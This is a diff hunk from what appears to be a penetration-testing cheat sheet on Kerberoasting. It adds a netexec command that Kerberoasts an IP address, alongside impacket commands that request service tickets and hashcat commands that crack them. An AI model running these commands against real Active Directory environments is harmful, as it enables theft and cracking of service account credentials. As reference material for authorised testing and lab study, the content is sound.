@@ -167,6 +167,7 @@ impacket-GetUserSPNs -dc-ip $DC_IP $DOMAIN/<username>
 # Request tickets and save to file
 impacket-GetUserSPNs -dc-ip $DC_IP $DOMAIN/<username> -request -outputfile tgs
 impacket-GetUserSPNs -dc-ip $DC_IP $DOMAIN/<username> -request-user target_user
+netexec ldap 10.129.204.177 -u user -p password --kerberoasting kerberoasting.out
 # Crack tickets using hashcat
 hashcat -m 13100 <ticket_file> <wordlist_path>   # RC4 encryption
 hashcat -m 19700 <ticket_file> <wordlist_path>   # AES encryption
